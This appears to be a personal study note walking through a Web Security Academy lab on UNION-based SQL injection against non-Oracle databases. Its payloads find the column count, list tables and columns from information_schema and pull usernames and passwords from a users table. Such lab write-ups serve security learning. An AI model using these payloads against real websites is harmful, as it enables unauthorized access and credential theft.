---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/listing-the-database-contents-on-non-oracle-databases/"}
---






- Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

```Plain
'+UNION+SELECT+'abc','def'--
```

- Use the following payload to retrieve the list of tables in the database: `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- Use the following payload to display the table of usernames and passwords (replace the table names and users_abcdef)
    - `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
    - `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`